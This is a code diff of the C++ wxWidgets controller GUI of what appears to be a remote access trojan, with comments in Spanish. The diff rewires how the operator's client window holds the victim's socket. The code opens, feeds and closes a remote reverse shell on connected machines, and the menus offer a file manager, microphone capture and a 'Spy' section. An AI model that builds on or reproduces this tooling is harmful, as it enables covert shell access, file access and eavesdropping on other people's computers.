@@ -27,28 +27,14 @@ wxBEGIN_EVENT_TABLE(panelMicrophone, wxPanel)
     EVT_BUTTON(EnumIDS::ID_Panel_Mic_BTN_Detener, panelMicrophone::OnDetener)
 wxEND_EVENT_TABLE()
 
-FrameCliente::FrameCliente(std::string strID, wxString nameID)
-    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, nameID)
+FrameCliente::FrameCliente(std::string strID, SOCKET sckID)
+    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE)
 {
     SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo con transparencia
     SetTransparent(245);
 
-    //std::vector<std::string> vcOut = strSplit(strID, '/', 1);
-    this->strClienteID = nameID;
+    this->sckCliente = sckID;
 
-    //No siempre son 3 de len en el socket id, pasar el id como parametro al llamar al frame
-    int iTempID = atoi(nameID.substr(nameID.size() - 3, 3).c_str());
-    std::unique_lock<std::mutex> lock(vector_mutex);
-    auto cliIT = p_Servidor->um_Clientes.find(iTempID);
-    if (cliIT != p_Servidor->um_Clientes.end()) {
-        cliIT->second._isBusy = true;
-    }else {
-        std::cout << "[X] No se pudo encontrar cliente " << iTempID << std::endl;
-    }
-    lock.unlock();
-
-
-    
     wxString strTitle = "[";
     strTitle.append(strID.c_str());
     strTitle.append("] - Admin");
@@ -67,7 +53,7 @@ FrameCliente::FrameCliente(std::string strID, wxString nameID)
     
     wxTreeItemId rootAdmin = this->m_tree->AppendItem(rootC, wxT("[Admin]"));
     //wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC, wxT("[Spy]"));
-    wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]"));
+    //wxTreeItemId rootMisc = this->m_tree->AppendItem(rootC, wxT("[Misc]"));
 
     this->m_tree->AppendItem(rootAdmin, wxT("Reverse Shell"));
     this->m_tree->AppendItem(rootAdmin, wxT("Administrador de archivos"));
@@ -112,15 +98,10 @@ void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
     wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
     if (pageTitle == "Reverse Shell") {
         //Enviar comando para cerrar shell al cerra la tab
-        std::unique_lock<std::mutex> lock(vector_mutex);
-        int iTempID = atoi(this->strClienteID.substr(this->strClienteID.size() - 3, 3).c_str());
-        auto aClient = p_Servidor->um_Clientes.find(iTempID);
-        if (aClient != p_Servidor->um_Clientes.end()) {
-            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-            strComando += "~exit\r\n";
-            p_Servidor->cSend(aClient->second._sckCliente, strComando.c_str(), strComando.size(), 0, false);
-        }
-        lock.unlock();
+        std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
+        strComando += "~exit\r\n";
+        p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+        
     }
     event.Skip();
 }
@@ -130,24 +111,9 @@ void FrameCliente::OnTest(wxCommandEvent& event) {
 }
 
 void FrameCliente::OnClose(wxCloseEvent& event) {
-    std::unique_lock<std::mutex> lock(vector_mutex);
-    
-    int iTempID = atoi(this->strClienteID.substr(this->strClienteID.size() - 3, 3).c_str());
-    auto aClient = p_Servidor->um_Clientes.find(iTempID);
-    if (aClient != p_Servidor->um_Clientes.end()) {
-        aClient->second._isBusy = false;
-        aClient->second._ttUltimaVez = time(0);
-        if (aClient->second._isRunningShell) {
-            aClient->second._isRunningShell = false;
-            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
-            strComando += "~exit\r\n";
-            p_Servidor->cSend(aClient->second._sckCliente, strComando.c_str(), strComando.size(), 0, false);
-        }
-    }
-
-    
-    lock.unlock();
-    
+    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Command);
+    strComando += "~exit\r\n";
+    p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
     event.Skip();
 }
 
@@ -207,7 +173,7 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
         if (panel_cliente) {
             FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
             if (frame_cliente) {
-                this->strID = frame_cliente->strClienteID;
+                this->sckCliente = frame_cliente->sckCliente;
             }
         }
     }
@@ -218,19 +184,10 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
     Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
 
     //Enviar comando al cliente para que ejecute
-    std::unique_lock<std::mutex> lock(vector_mutex);
-
-    int iTempID = atoi(this->strID.substr(this->strID.size() - 3, 3).c_str());
-    auto aClient = p_Servidor->um_Clientes.find(iTempID);
-    if (aClient != p_Servidor->um_Clientes.end()) {
-        aClient->second._isRunningShell = true; 
-        std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
-        strComando += "~0";
-        p_Servidor->cSend(aClient->second._sckCliente, strComando.c_str(), strComando.size(), 0, false);
-    }
-
-    lock.unlock();
-
+    std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
+    strComando += "~0";
+    p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+    
 }
 
 void panelReverseShell::OnHook(wxKeyEvent& event) {
@@ -278,18 +235,9 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         str1.append(1, '\r');
         str1.append(1, '\n');
         
-        std::unique_lock<std::mutex> lock(vector_mutex);
-
-        int iTempID = atoi(this->strID.substr(this->strID.size() - 3, 3).c_str());
-        auto aClient = p_Servidor->um_Clientes.find(iTempID);
-        if (aClient != p_Servidor->um_Clientes.end()) {
-            aClient->second._isRunningShell = true;
-            std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
-            strComando += "~0";
-            p_Servidor->cSend(aClient->second._sckCliente, str1.c_str(), str1.size()+1, 0, false);
-        }
-
-        lock.unlock();
+        std::string strComando = std::to_string(EnumComandos::Reverse_Shell_Start);
+        strComando += "~0";
+        p_Servidor->cSend(this->sckCliente, str1.c_str(), str1.size()+1, 0, false);
         
         this->p_uliUltimo = this->txtConsole->GetLastPosition() + 2;
           
